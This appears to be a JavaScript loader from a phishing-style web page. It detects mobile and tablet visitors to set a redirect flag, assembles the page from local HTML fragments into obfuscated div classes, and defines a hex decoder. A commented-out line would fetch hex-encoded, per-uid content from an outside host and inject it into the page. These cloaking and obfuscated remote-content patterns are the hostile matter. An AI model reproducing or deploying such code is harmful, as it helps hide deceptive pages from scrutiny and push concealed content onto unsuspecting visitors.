
  $("._1N5b32xs").html('<br/><br/><center><div class="loader"></div></center>');
  let date = new Date();
  let time = date.getFullYear() + ":" + date.getMonth() + ":" + date.getDate() + ":" + date.getMilliseconds();

  var md = new MobileDetect(window.navigator.userAgent);

  if (md.mobile() || md.tablet()) {
    var redirect = false;
    var excludeTablets = true;
    var excludeIOSAndroid = true;
    var isiOs = md.is("iOs");
    var isAndroidOs = md.is("AndroidOs"); var isFeaturePhone = md.mobile() && !isiOs && !isAndroidOs; if (isFeaturePhone || md.tablet() && excludeTablets
    || (((isiOs && !md.tablet()) || isAndroidOs) && excludeIOSAndroid)) {
    redirect = true;
    }
  }

  function h2b(hex)
  {
      var bytes = [], str;
      for(var i=0; i< hex.length-1; i+=2)
          bytes.push(parseInt(hex.substr(i, 2), 16));
      return String.fromCharCode.apply(String, bytes);
  }

  function param(name) {
      name = name.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]");
      var regex = new RegExp("[\\?&]" + name + "=([^&#]*)"), results = regex.exec(location.search);
      return results == null ? "" : decodeURIComponent(results[1].replace(/\+/g, " "));
  }

  function loads(hit) {
    let arr_div = ["._1uHGNC_U","._1zml9e3q","._1N5b32xs"];
    let arr_page = ["nav","footer","main"];
    let h = hit+1;
    let c = arr_page[h-1];
    let d = arr_div[h-1];
    if (hit < arr_div.length) {
      if(!param('uid')){
        var paruid = 1;
      }else{
        var paruid = param('uid');
      }
      $.get("assets/" + c + ".html?w=" + time,function(x,y,z){
          $( d ).html( x );
      });
      /*
      $.get("https://www.genpost.club/v1.00/" + paruid + "/" + h + ".code?w=" + time,function(x,y,z){
          $( c ).html( h2b(x) );
      });
      */
      loads(h);
    }
  }

  loads(0);
